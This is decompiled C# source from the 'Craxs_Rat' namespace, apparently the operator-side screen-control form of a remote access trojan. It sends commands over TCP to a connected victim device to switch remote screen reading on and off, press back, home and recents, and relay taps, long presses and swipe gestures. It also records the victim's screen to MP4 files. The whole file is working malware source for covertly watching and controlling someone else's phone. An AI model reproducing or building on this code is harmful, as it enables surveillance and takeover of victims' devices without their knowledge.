using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Accord.Video.FFMPEG;
using Craxs_Rat.My;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000C7 RID: 199
	[DesignerGenerated]
	public partial class ScreenReaderV2 : Form
	{
		// Token: 0x06000E8C RID: 3724 RVA: 0x00099454 File Offset: 0x00097654
		public ScreenReaderV2()
		{
			base.Load += this.ScreenReaderV2_Load;
			base.FormClosing += this.ScreenReaderV2_FormClosing;
			this.int_0 = 25;
			this.bool_0 = false;
			this.bool_1 = false;
			this.int_1 = 0;
			this.bool_3 = false;
			this.bool_4 = false;
			this.int_2 = 0;
			this.string_2 = "null";
			this.int_3 = 0;
			this.InitializeComponent();
		}

		// Token: 0x1700044C RID: 1100
		// (get) Token: 0x06000E8F RID: 3727 RVA: 0x00006B9C File Offset: 0x00004D9C
		// (set) Token: 0x06000E90 RID: 3728 RVA: 0x0009A518 File Offset: 0x00098718
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x1700044D RID: 1101
		// (get) Token: 0x06000E91 RID: 3729 RVA: 0x00006BA4 File Offset: 0x00004DA4
		// (set) Token: 0x06000E92 RID: 3730 RVA: 0x0009A52C File Offset: 0x0009872C
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon2_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon2 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x1700044E RID: 1102
		// (get) Token: 0x06000E93 RID: 3731 RVA: 0x00006BAC File Offset: 0x00004DAC
		// (set) Token: 0x06000E94 RID: 3732 RVA: 0x0009A570 File Offset: 0x00098770
		internal virtual DrakeUIButtonIcon disablebtn
		{
			[CompilerGenerated]
			get
			{
				return this._disablebtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.disablebtn_Click);
				DrakeUIButtonIcon disablebtn = this._disablebtn;
				if (disablebtn != null)
				{
					disablebtn.Click -= value2;
				}
				this._disablebtn = value;
				disablebtn = this._disablebtn;
				if (disablebtn != null)
				{
					disablebtn.Click += value2;
				}
			}
		}

		// Token: 0x1700044F RID: 1103
		// (get) Token: 0x06000E95 RID: 3733 RVA: 0x00006BB4 File Offset: 0x00004DB4
		// (set) Token: 0x06000E96 RID: 3734 RVA: 0x0009A5B4 File Offset: 0x000987B4
		internal virtual DrakeUIButtonIcon enablebtn
		{
			[CompilerGenerated]
			get
			{
				return this._enablebtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.enablebtn_Click);
				DrakeUIButtonIcon enablebtn = this._enablebtn;
				if (enablebtn != null)
				{
					enablebtn.Click -= value2;
				}
				this._enablebtn = value;
				enablebtn = this._enablebtn;
				if (enablebtn != null)
				{
					enablebtn.Click += value2;
				}
			}
		}

		// Token: 0x17000450 RID: 1104
		// (get) Token: 0x06000E97 RID: 3735 RVA: 0x00006BBC File Offset: 0x00004DBC
		// (set) Token: 0x06000E98 RID: 3736 RVA: 0x0009A5F8 File Offset: 0x000987F8
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x17000451 RID: 1105
		// (get) Token: 0x06000E99 RID: 3737 RVA: 0x00006BC4 File Offset: 0x00004DC4
		// (set) Token: 0x06000E9A RID: 3738 RVA: 0x0009A60C File Offset: 0x0009880C
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon1_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon1 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000452 RID: 1106
		// (get) Token: 0x06000E9B RID: 3739 RVA: 0x00006BCC File Offset: 0x00004DCC
		// (set) Token: 0x06000E9C RID: 3740 RVA: 0x0009A650 File Offset: 0x00098850
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon3;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon3_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon3;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon3 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon3;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000453 RID: 1107
		// (get) Token: 0x06000E9D RID: 3741 RVA: 0x00006BD4 File Offset: 0x00004DD4
		// (set) Token: 0x06000E9E RID: 3742 RVA: 0x0009A694 File Offset: 0x00098894
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon4;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon4_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon4;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon4 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon4;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000457 RID: 1111
		// (get) Token: 0x06000E9F RID: 3743 RVA: 0x00006BDC File Offset: 0x00004DDC
		// (set) Token: 0x06000EA0 RID: 3744 RVA: 0x0009A6D8 File Offset: 0x000988D8
		internal virtual Timer presstimer
		{
			[CompilerGenerated]
			get
			{
				return this._presstimer;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.presstimer_Tick);
				Timer presstimer = this._presstimer;
				if (presstimer != null)
				{
					presstimer.Tick -= value2;
				}
				this._presstimer = value;
				presstimer = this._presstimer;
				if (presstimer != null)
				{
					presstimer.Tick += value2;
				}
			}
		}

		// Token: 0x17000458 RID: 1112
		// (get) Token: 0x06000EA1 RID: 3745 RVA: 0x00006BE4 File Offset: 0x00004DE4
		// (set) Token: 0x06000EA2 RID: 3746 RVA: 0x0009A71C File Offset: 0x0009891C
		internal virtual DrakeUIToolTip DrakeUIToolTip1 { get; set; }

		// Token: 0x17000454 RID: 1108
		// (get) Token: 0x06000EA3 RID: 3747 RVA: 0x00006BEC File Offset: 0x00004DEC
		// (set) Token: 0x06000EA4 RID: 3748 RVA: 0x0009A730 File Offset: 0x00098930
		internal virtual DrakeUICheckBox Save
		{
			[CompilerGenerated]
			get
			{
				return this._Save;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Save_MouseClick);
				DrakeUICheckBox save = this._Save;
				if (save != null)
				{
					save.MouseClick -= value2;
				}
				this._Save = value;
				save = this._Save;
				if (save != null)
				{
					save.MouseClick += value2;
				}
			}
		}

		// Token: 0x17000459 RID: 1113
		// (get) Token: 0x06000EA5 RID: 3749 RVA: 0x00006BF4 File Offset: 0x00004DF4
		// (set) Token: 0x06000EA6 RID: 3750 RVA: 0x0009A774 File Offset: 0x00098974
		internal virtual Timer savetimer
		{
			[CompilerGenerated]
			get
			{
				return this._savetimer;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.savetimer_Tick);
				Timer savetimer = this._savetimer;
				if (savetimer != null)
				{
					savetimer.Tick -= value2;
				}
				this._savetimer = value;
				savetimer = this._savetimer;
				if (savetimer != null)
				{
					savetimer.Tick += value2;
				}
			}
		}

		// Token: 0x17000455 RID: 1109
		// (get) Token: 0x06000EA7 RID: 3751 RVA: 0x00006BFC File Offset: 0x00004DFC
		// (set) Token: 0x06000EA8 RID: 3752 RVA: 0x0009A7B8 File Offset: 0x000989B8
		internal virtual Label activetext { get; set; }

		// Token: 0x17000456 RID: 1110
		// (get) Token: 0x06000EA9 RID: 3753 RVA: 0x00006C04 File Offset: 0x00004E04
		// (set) Token: 0x06000EAA RID: 3754 RVA: 0x0009A7CC File Offset: 0x000989CC
		internal virtual PictureBox viewpic
		{
			[CompilerGenerated]
			get
			{
				return this._viewpic;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.viewpic_MouseDown);
				MouseEventHandler value3 = new MouseEventHandler(this.viewpic_MouseMove);
				MouseEventHandler value4 = new MouseEventHandler(this.viewpic_MouseUp);
				PictureBox viewpic = this._viewpic;
				if (viewpic != null)
				{
					viewpic.MouseDown -= value2;
					viewpic.MouseMove -= value3;
					viewpic.MouseUp -= value4;
				}
				this._viewpic = value;
				viewpic = this._viewpic;
				if (viewpic != null)
				{
					viewpic.MouseDown += value2;
					viewpic.MouseMove += value3;
					viewpic.MouseUp += value4;
				}
			}
		}

		// Token: 0x06000EAB RID: 3755 RVA: 0x0000246D File Offset: 0x0000066D
		private void ScreenReaderV2_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000EAC RID: 3756 RVA: 0x0000246D File Offset: 0x0000066D
		private void savetimer_Tick(object sender, EventArgs e)
		{
		}

		// Token: 0x06000EAD RID: 3757 RVA: 0x0009A848 File Offset: 0x00098A48
		private void Save_MouseClick(object sender, MouseEventArgs e)
		{
			if (this.Save.Checked)
			{
				this.bool_4 = true;
				this.videoFileWriter_0 = new VideoFileWriter();
				this.string_1 = DateTime.Now.ToString("yyyy-MM-dd_HH-mmss") + ".mp4";
				if (!Directory.Exists(this.string_0 + "\\Screen_Read_V2"))
				{
					Directory.CreateDirectory(this.string_0 + "\\Screen_Read_V2");
				}
				int width = Module2.smethod_0(this.viewpic.Width, 2);
				int height = Module2.smethod_0(this.viewpic.Height, 2);
				this.int_0 = Conversions.ToInteger(MySettingsProperty.Settings.live_fps_rec);
				this.videoFileWriter_0.Open(this.string_0 + "\\Screen_Read_V2\\" + this.string_1, width, height, this.int_0, VideoCodec.MPEG4);
			}
			else
			{
				this.bool_4 = false;
				this.videoFileWriter_0.Close();
			}
		}

		// Token: 0x06000EAE RID: 3758 RVA: 0x0009A948 File Offset: 0x00098B48
		private void presstimer_Tick(object sender, EventArgs e)
		{
			ref int ptr = ref this.int_3;
			this.int_3 = checked(ptr + 1);
		}

		// Token: 0x06000EAF RID: 3759 RVA: 0x0009A964 File Offset: 0x00098B64
		private void enablebtn_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"SCRD2<*>o",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
				this.enablebtn.Enabled = false;
				this.disablebtn.Enabled = true;
			}
		}

		// Token: 0x06000EB0 RID: 3760 RVA: 0x0009AA94 File Offset: 0x00098C94
		private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			this.viewpic.Image = Module2.smethod_29();
		}

		// Token: 0x06000EB1 RID: 3761 RVA: 0x0009AAB4 File Offset: 0x00098CB4
		private void disablebtn_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				TcpClient tcpClient_ = this.gclass8_0.tcpClient_0;
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"SCRD2<*>f",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
				this.enablebtn.Enabled = true;
				this.disablebtn.Enabled = false;
			}
		}

		// Token: 0x06000EB2 RID: 3762 RVA: 0x0009ABE4 File Offset: 0x00098DE4
		private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				try
				{
					string[] array = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.gclass8_0.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>Bc",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000EB3 RID: 3763 RVA: 0x0009AD1C File Offset: 0x00098F1C
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				try
				{
					string[] array = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.gclass8_0.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>Ho",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000EB4 RID: 3764 RVA: 0x0009AE54 File Offset: 0x00099054
		private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				try
				{
					string[] array = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.gclass8_0.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>RC",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000EB5 RID: 3765 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_10(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000EB6 RID: 3766 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_11(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000EB7 RID: 3767 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_12(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000EB8 RID: 3768 RVA: 0x0009AF8C File Offset: 0x0009918C
		private void viewpic_MouseDown(object sender, MouseEventArgs e)
		{
			this.bool_3 = false;
			if (e.Button == MouseButtons.Left)
			{
				this.points_0 = new List<Point>();
				this.points_0.Add(new Point(e.X, e.Y));
				this.bool_0 = false;
				this.int_1 = -1;
			}
			else
			{
				this.presstimer.Enabled = true;
				this.bool_0 = true;
			}
		}

		// Token: 0x06000EB9 RID: 3769 RVA: 0x0009AFFC File Offset: 0x000991FC
		private void viewpic_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.int_1 != 0)
			{
				this.bool_1 = true;
				this.bool_0 = false;
				this.points_0.Add(new Point(e.X, e.Y));
			}
		}

		// Token: 0x06000EBA RID: 3770 RVA: 0x0009B040 File Offset: 0x00099240
		private void viewpic_MouseUp(object sender, MouseEventArgs e)
		{
			this.int_1 = 0;
			int width = this.viewpic.Width;
			int height = this.viewpic.Height;
			checked
			{
				if (!this.bool_0)
				{
					if (this.bool_1)
					{
						this.bool_1 = false;
						this.points_0.Add(new Point(e.X, e.Y));
						StringBuilder stringBuilder = new StringBuilder();
						try
						{
							foreach (Point point in this.points_0)
							{
								stringBuilder.Append(new Point((int)Math.Round(unchecked((double)point.X * ((double)this.size_0.Width / (double)width))), (int)Math.Round(unchecked((double)point.Y * ((double)this.size_0.Height / (double)height)))).ToString() + ":");
							}
						}
						finally
						{
							List<Point>.Enumerator enumerator;
							((IDisposable)enumerator).Dispose();
						}
						string[] array = this.gclass8_0.string_0.Split(new char[]
						{
							':'
						});
						object[] objects_ = new object[]
						{
							this.object_0,
							string.Concat(new string[]
							{
								Module13.string_29,
								GClass9.string_0,
								"sp<*>",
								stringBuilder.ToString(),
								GClass9.string_0,
								array[0],
								GClass9.string_0,
								array[1],
								GClass9.string_0,
								Module13.string_5,
								GClass9.string_0,
								Conversions.ToString(0),
								GClass9.string_0,
								Conversions.ToString(0),
								GClass9.string_0,
								GClass9.string_3,
								GClass9.string_0,
								this.gclass8_0.string_2
							}),
							Module2.smethod_9().GetBytes("null"),
							this.gclass8_0
						};
						this.gclass8_0.method_2(objects_);
					}
				}
				else
				{
					this.presstimer.Enabled = false;
					this.presstimer.Stop();
					string text = "clk:";
					if (this.int_3 > 3)
					{
						text = "clk:hold:";
					}
					this.int_3 = 0;
					Point point2 = this.viewpic.PointToClient(Control.MousePosition);
					Point point3 = new Point((int)Math.Round(unchecked((double)point2.X * ((double)this.size_0.Width / (double)width))), (int)Math.Round(unchecked((double)point2.Y * ((double)this.size_0.Height / (double)height))));
					text = text + point3.X.ToString() + ":" + point3.Y.ToString();
					string[] array2 = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_2 = new object[]
					{
						this.object_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>",
							text,
							GClass9.string_0,
							array2[0],
							GClass9.string_0,
							array2[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_2);
				}
			}
		}

		// Token: 0x06000EBB RID: 3771 RVA: 0x0009B41C File Offset: 0x0009961C
		private void ScreenReaderV2_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				if (this.bool_4 && this.videoFileWriter_0 != null)
				{
					this.bool_4 = false;
					this.videoFileWriter_0.Close();
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0400080D RID: 2061
		public VideoFileWriter videoFileWriter_0;

		// Token: 0x0400080E RID: 2062
		private int int_0;

		// Token: 0x0400080F RID: 2063
		private bool bool_0;

		// Token: 0x04000810 RID: 2064
		private bool bool_1;

		// Token: 0x04000811 RID: 2065
		private int int_1;

		// Token: 0x04000812 RID: 2066
		private List<Point> points_0;

		// Token: 0x04000813 RID: 2067
		public TcpClient object_0;

		// Token: 0x04000814 RID: 2068
		public object object_1;

		// Token: 0x04000815 RID: 2069
		public GClass8 gclass8_0;

		// Token: 0x04000816 RID: 2070
		public string string_0;

		// Token: 0x04000817 RID: 2071
		public string string_1;

		// Token: 0x04000818 RID: 2072
		public Size size_0;

		// Token: 0x04000819 RID: 2073
		public bool bool_2;

		// Token: 0x0400081A RID: 2074
		public bool bool_3;

		// Token: 0x0400081B RID: 2075
		public bool bool_4;

		// Token: 0x0400081C RID: 2076
		public int int_2;

		// Token: 0x0400081D RID: 2077
		public string string_2;

		// Token: 0x0400081E RID: 2078
		private int int_3;
	}
}
